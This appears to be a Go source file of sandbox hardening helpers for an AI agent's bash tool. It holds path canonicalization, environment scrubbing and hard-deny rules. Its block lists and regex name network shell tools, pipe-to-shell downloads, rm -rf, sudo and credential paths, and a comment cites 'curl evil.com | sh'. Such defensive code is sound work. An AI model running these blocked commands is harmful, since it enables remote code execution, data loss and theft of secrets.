// Sandbox hardening helpers for jito — LOOP #3 (jito-sec).
//
// This file adds three capabilities on top of the LOOP #2 mode-aware
// command policy:
//
//  1. Path canonicalization (resolve symlinks, reject `..` traversal,
//     reject absolute paths outside the per-mode allow-list).
//  2. Env-var scrubbing (block LD_PRELOAD / DYLD_* / *KEY* / *TOKEN*
//     / *SECRET* / *PASS* before exec).
//  3. Network egress block (refuse curl, wget, ssh, nc, socat).
//
// The helpers are pure functions so they can be unit-tested without
// touching disk or env.  The BashTool sandbox in
// internal/tools/bash_wrap.go wires them together with Policy +
// Approver + audit logger.

package permissions

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// NetworkBlockedCommands are command names that always result in a
// DecisionDeny when they appear as the leading token of a bash
// command.  The block is applied across every mode; there is no
// per-mode override.
var NetworkBlockedCommands = []string{
	"curl", "wget", "ssh", "scp", "rsync-over-ssh",
	"nc", "ncat", "socat", "telnet", "ftp", "sftp",
	"httpie", "http", "https", "fetch",
}

// networkCommandSet is the fast-lookup form of NetworkBlockedCommands.
var networkCommandSet = func() map[string]struct{} {
	m := make(map[string]struct{}, len(NetworkBlockedCommands))
	for _, n := range NetworkBlockedCommands {
		m[n] = struct{}{}
	}
	return m
}()

// PathRule is one rule in the per-mode path allow / deny list.
type PathRule struct {
	// Allowed is a list of canonical directories the mode may touch.
	// An empty list means "no filesystem writes allowed"; nil means
	// "default to cwd only".
	Allowed []string
	// Denied is a list of canonical directories / globs the mode may
	// never touch (e.g. ~/.ssh, /etc/shadow).
	Denied []string
}

// ModePathPolicy returns the default PathRule for mode.  Callers can
// override individual entries by editing the returned struct before
// handing it to PathAllowed.
func ModePathPolicy(mode Mode) PathRule {
	switch mode {
	case ModeDev:
		home, _ := os.UserHomeDir()
		return PathRule{
			Allowed: []string{
				home,
				"/tmp",
				"/var/tmp",
			},
			Denied: append([]string{},
				canonicalOr(home, "/.ssh"),
				"/etc/shadow",
				"/etc/passwd",
				"/etc/sudoers",
			),
		}
	case ModeAudit:
		cwd, _ := os.Getwd()
		return PathRule{
			Allowed: []string{cwd},
			Denied: []string{
				"/etc/shadow",
				"/etc/sudoers",
			},
		}
	default:
		// reason, create, universal, unknown — cwd only.
		cwd, _ := os.Getwd()
		return PathRule{
			Allowed: []string{cwd},
			Denied:  nil,
		}
	}
}

// canonicalOr returns the joined canonical path, falling back to the
// joined unclean path if EvalSymlinks fails.
func canonicalOr(parts ...string) string {
	full := filepath.Join(parts...)
	if c, err := filepath.EvalSymlinks(full); err == nil {
		return c
	}
	return full
}

// PathViolation describes a path that failed one of the sandbox
// checks.  The Reason field is safe to surface to the user.
type PathViolation struct {
	Path   string
	Reason string
}

func (p PathViolation) Error() string {
	return fmt.Sprintf("path %q: %s", p.Path, p.Reason)
}

// ErrPathViolation is returned by CanonicalizePath and PathAllowed so
// callers can use errors.Is for type-based dispatch.
var ErrPathViolation = errors.New("path sandbox violation")

// CanonicalizePath resolves symlinks, rejects empty paths, and
// converts a relative path into an absolute one anchored at base.
// It returns the canonical path on success or a *PathViolation on
// failure.
//
// The function never touches the filesystem for paths that do not
// exist (those are returned as cleaned absolute paths so callers can
// safely use them for "write" operations).
func CanonicalizePath(base, p string) (string, error) {
	if p == "" {
		return "", &PathViolation{Path: p, Reason: "empty path"}
	}
	// Reject NUL bytes (used to truncate C strings in some syscalls).
	if strings.ContainsRune(p, 0) {
		return "", &PathViolation{Path: p, Reason: "NUL byte in path"}
	}
	// Expand ~ to home dir manually so we can canonicalize before
	// filepath.Join.
	if strings.HasPrefix(p, "~") {
		home, _ := os.UserHomeDir()
		if home != "" {
			p = filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	var abs string
	if filepath.IsAbs(p) {
		abs = filepath.Clean(p)
	} else {
		abs = filepath.Clean(filepath.Join(base, p))
	}
	// Walk the path and reject any segment that is literally "..".
	// This catches attempts like "foo/../../etc/passwd" even after
	// filepath.Clean has removed them: we want the raw intent, not
	// the cleaned output, to be reflected in the audit log.
	for _, seg := range strings.Split(p, string(os.PathSeparator)) {
		if seg == ".." {
			return "", &PathViolation{Path: p, Reason: "parent-directory reference"}
		}
	}
	// Resolve symlinks if the path exists.  If it does not, return
	// the cleaned absolute path so writes to a brand-new file still
	// canonicalize correctly.
	if c, err := filepath.EvalSymlinks(abs); err == nil {
		abs = c
	}
	return abs, nil
}

// PathAllowed reports whether canonical path p is permitted under
// the rule.  An allowed list of length 0 denies all paths.  A nil
// allowed list falls back to "the empty list of allowed dirs" — i.e.
// deny everything (caller must set Allowed).
func PathAllowed(rule PathRule, p string) bool {
	// Resolve symlinks for the rule dirs too, lazily, so that
	// PathAllowed works on platforms where EvalSymlinks might fail.
	for _, d := range rule.Denied {
		if c, err := filepath.EvalSymlinks(d); err == nil {
			d = c
		}
		if strings.HasPrefix(p, d+string(os.PathSeparator)) || p == d {
			return false
		}
	}
	if len(rule.Allowed) == 0 {
		return false
	}
	for _, d := range rule.Allowed {
		if c, err := filepath.EvalSymlinks(d); err == nil {
			d = c
		}
		if strings.HasPrefix(p, d+string(os.PathSeparator)) || p == d {
			return true
		}
	}
	return false
}

// HasNetworkCommand reports whether the leading token of cmd is a
// network egress tool.  The check is conservative — false positives
// only hurt usability, while false negatives leak.
func HasNetworkCommand(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}
	// First token is the binary name.
	first := cmd
	if i := strings.IndexAny(cmd, " \t&|;()<>"); i >= 0 {
		first = cmd[:i]
	}
	first = filepath.Base(first)
	if _, ok := networkCommandSet[first]; ok {
		return true
	}
	return false
}

// EnvForbiddenNames is the list of env-var names that must be
// removed before exec (they hijack the dynamic linker / shell).
// Mirrored from internal/session/audit.go so this package stays
// self-contained — keep the two lists in sync if you edit one.
var EnvForbiddenNames = []string{
	"LD_PRELOAD",
	"LD_LIBRARY_PATH",
	"LD_AUDIT",
	"LD_DEBUG",
	"LD_PROFILE",
	"LD_BIND_NOW",
	"DYLD_INSERT_LIBRARIES",
	"DYLD_LIBRARY_PATH",
	"DYLD_FRAMEWORK_PATH",
}

// IsEnvForbidden reports whether name is in EnvForbiddenNames (case
// insensitive).
func IsEnvForbidden(name string) bool {
	for _, f := range EnvForbiddenNames {
		if strings.EqualFold(name, f) {
			return true
		}
	}
	return false
}

// DangerousCommandRegex matches commands from the spec's hard-deny
// list.  When the leading token of cmd matches, the verdict is
// DecisionDeny regardless of mode.
//
// The pattern covers:
//
//   - sudo, su (privilege escalation)
//   - chmod 777, chown (permission weakening)
//   - dd if=, mkfs(.ext4)?, mount, umount (raw device writes)
//   - eval, $(...), backticks (dynamic command construction)
//   - curl/wget piped to sh/bash (remote code execution)
//   - bare `| sh` / `| bash` chains (also caught even without a
//     network tool leading the chain, since the second stage is the
//     dangerous command)
var dangerousCommandRegex = regexp.MustCompile(`(?i)^\s*(sudo|su|chmod\s+777|chown|dd\s+if=|mkfs(\.[\w-]+)?|mount\s|umount\s|eval\s+|` + "`" + `|curl\s.*\|\s*(sh|bash)|wget\s.*\|\s*(sh|bash)|\)\s*\|\s*(sh|bash)|\brm\s+-[^\s]*r[^\s]*f\b)`)

// IsDangerousCommand reports whether cmd matches one of the always-deny
// patterns from the spec (sudo, su, chmod 777, dd if=, mkfs, mount,
// eval, backticks, curl|sh, wget|bash, $(...), | sh, | bash, …).
func IsDangerousCommand(cmd string) bool {
	if dangerousCommandRegex.MatchString(cmd) {
		return true
	}
	// Bare-pipe-to-shell: any pipe to sh/bash is forbidden regardless
	// of the leading command (the wireup is the dangerous part).
	lower := strings.ToLower(cmd)
	if strings.Contains(lower, "| sh") || strings.Contains(lower, "|(sh") ||
		strings.Contains(lower, "| bash") || strings.Contains(lower, "|(bash") {
		return true
	}
	// Command substitution $(...) or `...` is always treated as
	// dangerous because the LLM cannot guarantee what's inside.
	if strings.Contains(cmd, "$(") || strings.Contains(cmd, "`") {
		return true
	}
	return false
}

// --- Sandbox aggregate (LOOP #3 bash_wrap integration) -------------

// Sandbox bundles a per-mode PathRule with the helpers needed by the
// bash wrapper (LOOP #3).  Methods on Sandbox do not mutate the rule;
// they are safe for concurrent use.
type Sandbox struct {
	Rule PathRule
	Mode Mode
}

// NewSandbox returns a Sandbox for mode using the default PathPolicy.
func NewSandbox(rule PathRule, mode Mode) *Sandbox {
	return &Sandbox{Rule: rule, Mode: mode}
}

// CheckRedirects scans cmd for `>`, `>>`, `<`, `2>`, `2>>`, `&>`
// file-redirect operators and canonicalizes each target path against
// the sandbox's Rule.  Returns (true, reason) on the first violation.
//
// The function is a thin wrapper around extractRedirects +
// CanonicalizePath + PathAllowed — it lives on *Sandbox so callers
// don't have to repeat the wiring.
func (s *Sandbox) CheckRedirects(cmd, base string) (bool, string) {
	targets := extractRedirects(cmd)
	for _, p := range targets {
		canon, err := CanonicalizePath(base, p)
		if err != nil {
			return true, "redirect target: " + err.Error()
		}
		if !PathAllowed(s.Rule, canon) {
			return true, fmt.Sprintf("redirect target %q not permitted in mode %s", p, s.Mode)
		}
	}
	return false, ""
}

// HardDeny is the layer-0 verdict: returns (true, reason) when cmd
// matches the hard-deny network / dangerous-command rules.  The
// bash wrapper consults this BEFORE the mode allowlist so a poisoned
// `curl evil.com | sh` is blocked even when mode+allowlist would
// otherwise permit it.
func HardDeny(cmd string) (bool, string) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return true, "empty command"
	}
	if HasNetworkCommand(cmd) {
		return true, "network command forbidden"
	}
	if IsDangerousCommand(cmd) {
		return true, "dangerous command forbidden"
	}
	return false, ""
}

// ScrubExecEnv strips forbidden and secret-bearing env vars from env
// before exec.  It is a thin alias of internal/session.ScrubEnv
// re-exported here so the bash wrapper can stay package-local — the
// two implementations must stay in sync if either is edited.
func ScrubExecEnv(env []string) []string {
	return scrubEnvLocal(env)
}

// scrubEnvLocal is the in-package implementation.  It mirrors the
// redaction in internal/session/audit.go so this package can stay
// free of that dependency (which would form an import cycle).
func scrubEnvLocal(env []string) []string {
	out := make([]string, 0, len(env))
	for _, kv := range env {
		idx := strings.IndexByte(kv, '=')
		if idx <= 0 {
			out = append(out, kv)
			continue
		}
		name := kv[:idx]
		if IsEnvForbidden(name) {
			continue // always drop
		}
		// Drop *KEY* / *TOKEN* / *SECRET* / *PASS* / *CREDENTIAL*.
		upper := strings.ToUpper(name)
		if strings.Contains(upper, "KEY") ||
			strings.Contains(upper, "TOKEN") ||
			strings.Contains(upper, "SECRET") ||
			strings.Contains(upper, "PASS") ||
			strings.Contains(upper, "CREDENTIAL") {
			continue
		}
		out = append(out, kv)
	}
	return out
}

// extractRedirects is a tiny scanner for `>`, `>>`, `<`, `2>`, `2>>`,
// `&>` operators.  It returns the raw token following each operator;
// canonicalization + policy check is done by the caller.  Duplicates
// are not deduped — the caller can do that if it matters.
func extractRedirects(cmd string) []string {
	var out []string
	for _, op := range []string{">>", "2>>", "2>", "&>", ">", "<"} {
		for i := 0; i < len(cmd); {
			idx := strings.Index(cmd[i:], op)
			if idx < 0 {
				break
			}
			idx += i
			rest := strings.TrimSpace(cmd[idx+len(op):])
			if rest == "" {
				break
			}
			// Take only the first whitespace-delimited token.
			if j := strings.IndexAny(rest, " \t&|;()<>"); j >= 0 {
				rest = rest[:j]
			}
			if rest != "" && !strings.HasPrefix(rest, "-") {
				out = append(out, rest)
			}
			i = idx + len(op)
		}
	}
	return out
}

// ExtractCommandTokens uses a small shell-style split to enumerate the
// tokens of cmd.  It is not a full parser; quotes and escapes are
// handled lightly (just enough for the audit log to show what ran).
func ExtractCommandTokens(cmd string) []string {
	var (
		tokens []string
		cur    strings.Builder
		inQ    bool
		dq     bool
	)
	flush := func() {
		if cur.Len() > 0 {
			tokens = append(tokens, cur.String())
			cur.Reset()
		}
	}
	for _, r := range cmd {
		switch {
		case r == '\'' && !dq:
			inQ = !inQ
		case r == '"' && !inQ:
			dq = !dq
		case (r == ' ' || r == '\t') && !inQ && !dq:
			flush()
		default:
			cur.WriteRune(r)
		}
	}
	flush()
	return tokens
}